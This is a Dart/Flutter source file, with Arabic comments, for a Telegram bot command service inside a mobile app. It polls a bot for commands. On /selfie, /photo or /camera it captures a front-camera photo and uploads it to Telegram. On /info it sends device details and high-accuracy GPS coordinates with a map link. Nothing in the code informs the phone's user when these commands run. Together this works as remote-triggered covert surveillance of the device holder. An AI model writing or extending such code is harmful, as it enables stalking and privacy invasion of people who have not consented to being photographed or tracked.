import 'dart:async';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:geolocator/geolocator.dart';

import '../../common/utils/logger.dart';
import '../models/notification_model.dart';
import '../models/telegram_settings.dart';
import 'camera_service.dart';
import 'telegram_service.dart';

final botCommandServiceProvider = Provider<BotCommandService>(
  (ref) => BotCommandService(ref),
);

class BotCommandService {
  BotCommandService(this._ref);

  final Ref _ref;
  Timer? _pollingTimer;
  bool _isRunning = false;

  /// بدء الاستماع لأوامر البوت
  void startListening() {
    if (_isRunning) {
      logInfo('خدمة الأوامر تعمل بالفعل');
      return;
    }

    _isRunning = true;
    logInfo('بدء الاستماع لأوامر البوت');

    _pollingTimer = Timer.periodic(
      const Duration(seconds: 5),
      (_) => _checkForCommands(),
    );
  }

  /// إيقاف الاستماع لأوامر البوت
  void stopListening() {
    _isRunning = false;
    _pollingTimer?.cancel();
    _pollingTimer = null;
    logInfo('توقف الاستماع لأوامر البوت');
  }

  /// التحقق من وجود أوامر جديدة
  Future<void> _checkForCommands() async {
    if (!_isRunning) return;

    try {
      final telegramService = _ref.read(telegramServiceProvider);
      final settings = TelegramSettings.instance;
      final updates = await telegramService.getUpdates(settings.botToken);

      for (final update in updates) {
        await _handleUpdate(update);
      }
    } catch (e) {
      logError('خطأ في التحقق من الأوامر: $e');
    }
  }

  /// معالجة تحديث واحد
  Future<void> _handleUpdate(Map<String, dynamic> update) async {
    try {
      final message = update['message'] as Map<String, dynamic>?;
      if (message == null) return;

      final text = message['text'] as String?;
      if (text == null) return;

      logInfo('تم استقبال رسالة: $text');

      // معالجة الأوامر
      if (text.startsWith('/')) {
        await _handleCommand(text);
      }
    } catch (e) {
      logError('خطأ في معالجة التحديث: $e');
    }
  }

  /// معالجة الأوامر
  Future<void> _handleCommand(String command) async {
    final cmd = command.toLowerCase().trim();

    if (cmd == '/selfie' || cmd == '/photo' || cmd == '/camera') {
      await _takeSelfieAndSend();
    } else if (cmd == '/info' || cmd == '/status' || cmd == '/device') {
      await _sendDeviceInfo();
    } else if (cmd == '/start') {
      await _sendWelcomeMessage();
    }
  }

  /// التقاط صورة سيلفي وإرسالها
  Future<void> _takeSelfieAndSend() async {
    try {
      logInfo('بدء التقاط الصورة...');

      final cameraService = CameraService();
      final photo = await cameraService.takeSelfie();

      if (photo == null) {
        logError('فشل التقاط الصورة');
        return;
      }

      logInfo('تم التقاط الصورة بنجاح: ${photo.path}');

      final telegramService = _ref.read(telegramServiceProvider);
      final settings = TelegramSettings.instance;
      if (!settings.isValid || !settings.isEnabled) {
        logError('إعدادات تلكرام غير صالحة أو الإرسال معطل');
        return;
      }

      final success = await telegramService.sendPhoto(
        photo: photo,
        settings: settings,
        caption: '📸 صورة سيلفي\n🕐 ${DateTime.now()}',
      );

      if (success) {
        logInfo('تم إرسال الصورة بنجاح');
      } else {
        logError('فشل إرسال الصورة');
      }
    } catch (e) {
      logError('خطأ في التقاط وإرسال الصورة: $e');
    }
  }

  Future<void> _sendDeviceInfo() async {
    try {
      final settings = TelegramSettings.instance;
      if (!settings.isValid || !settings.isEnabled) {
        logError('إعدادات تلكرام غير صالحة أو الإرسال معطل');
        return;
      }

      final deviceInfoPlugin = DeviceInfoPlugin();
      final buffer = StringBuffer()..writeln('📋 معلومات الجهاز\n');

      if (Platform.isAndroid) {
        final info = await deviceInfoPlugin.androidInfo;
        buffer
          ..writeln(
            '• النظام: Android ${info.version.release} (SDK ${info.version.sdkInt})',
          )
          ..writeln('• الشركة: ${info.manufacturer}')
          ..writeln('• الطراز: ${info.model}')
          ..writeln('• الجهاز: ${info.device}');
      } else if (Platform.isIOS) {
        final info = await deviceInfoPlugin.iosInfo;
        buffer
          ..writeln('• النظام: iOS ${info.systemVersion}')
          ..writeln('• الطراز: ${info.utsname.machine}')
          ..writeln('• الاسم: ${info.name}');
      } else {
        buffer.writeln('• النظام: ${Platform.operatingSystem}');
      }

      final position = await _tryGetLocation();
      if (position != null) {
        final lat = position.latitude.toStringAsFixed(5);
        final lon = position.longitude.toStringAsFixed(5);
        buffer
          ..writeln('• الموقع: $lat, $lon')
          ..writeln('https://maps.google.com/?q=$lat,$lon');
      } else {
        buffer.writeln('• الموقع: غير متاح (لم يتم منح الإذن أو الموقع مغلق)');
      }

      final telegramService = _ref.read(telegramServiceProvider);
      await telegramService.sendNotification(
        notification: NotificationModel(
          title: 'معلومات الجهاز',
          text: buffer.toString(),
          package: 'system',
          time: DateTime.now(),
          extras: const {},
          actions: const [],
        ),
        settings: settings,
      );
    } catch (e) {
      logError('خطأ في إرسال معلومات الجهاز: $e');
    }
  }

  Future<Position?> _tryGetLocation() async {
    try {
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();
      if (!serviceEnabled) {
        return null;
      }

      LocationPermission permission = await Geolocator.checkPermission();
      if (permission == LocationPermission.denied) {
        permission = await Geolocator.requestPermission();
      }
      if (permission == LocationPermission.denied ||
          permission == LocationPermission.deniedForever) {
        return null;
      }

      return await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
    } catch (e) {
      logError('خطأ أثناء الحصول على الموقع: $e');
      return null;
    }
  }

  /// إرسال رسالة ترحيب
  Future<void> _sendWelcomeMessage() async {
    try {
      final telegramService = _ref.read(telegramServiceProvider);
      final settings = TelegramSettings.instance;

      if (!settings.isValid || !settings.isEnabled) {
        logError('إعدادات تلكرام غير صالحة أو الإرسال معطل');
        return;
      }

      await telegramService.sendNotification(
        notification: _createWelcomeNotification(),
        settings: settings,
      );
    } catch (e) {
      logError('خطأ في إرسال رسالة الترحيب: $e');
    }
  }

  /// إنشاء إشعار ترحيب
  _createWelcomeNotification() {
    return NotificationModel(
      title: 'مرحباً بك! 👋',
      text: '''
البوت جاهز للعمل!

الأوامر المتاحة:
/selfie - التقاط صورة سيلفي
/photo - التقاط صورة
/camera - التقاط صورة
''',
      package: 'System',
      time: DateTime.now(),
      extras: {},
      actions: [],
    );
  }
}
